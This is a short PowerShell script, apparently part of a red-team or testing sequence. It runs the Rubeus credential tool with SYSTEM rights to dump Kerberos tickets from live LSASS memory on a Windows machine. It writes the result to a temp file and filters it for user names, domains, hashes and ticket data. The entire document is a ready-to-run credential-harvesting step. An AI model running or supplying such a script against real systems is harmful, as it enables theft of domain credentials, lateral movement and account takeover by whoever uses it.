# 3.5K v6: Rubeus dump (official community build) live LSASS extraction as SYSTEM
$ErrorActionPreference = 'Continue'
$rb = 'C:\Windows\Temp\cadre-tools\Rubeus-official.exe'
$o = 'C:\Windows\Temp\rubeus-dump.txt'

Remove-Item $o -ErrorAction SilentlyContinue
cmd.exe /c "`"$rb`" dump /nowrap > `"$o`" 2>&1"
Start-Sleep -Seconds 3
Write-Output "RUBEUS_DUMP_OUT_SIZE $((Get-Item $o -ErrorAction SilentlyContinue).Length)"
Get-Content $o -ErrorAction SilentlyContinue | Select-String -Pattern 'UserName|Domain|UserPrincipalName|Hash|KRB|ERROR|error|X |ServiceName' | Select-Object -First 50 | ForEach-Object { $_.Line }
Write-Output 'RUBEUS_DUMP_DONE'
